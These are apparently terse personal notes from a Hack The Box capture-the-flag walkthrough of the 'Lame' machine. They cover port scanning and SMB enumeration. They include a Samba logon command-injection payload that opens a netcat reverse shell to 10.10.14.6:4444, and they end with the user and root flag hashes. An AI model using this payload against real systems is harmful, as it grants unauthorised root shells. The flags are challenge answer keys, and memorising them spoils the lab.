```
Lame - 10.10.10.3
```

#Ports Open - 21,22,139.445

#Detail of Ports
>21		ftp
>22		ssh
>139	smb
>445	smb

#Findings + Exploitation
>nmap shows old ftpd version
>tried to exploit using msfconsole but failed
>used smbmap to get shares
	smbmap -H 10.10.10.3
>used smbclient to log in smb
	smbclient //10.10.10.3/tmp
>smb is old version with an exploit
	logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
>start a listener and get shell
>in this case we are ROOT!!!
>user.txt
	0ce0938673d5b938ade191eb47be96cf
>root.txt
	92ff315269f4d19a63a1192677c00902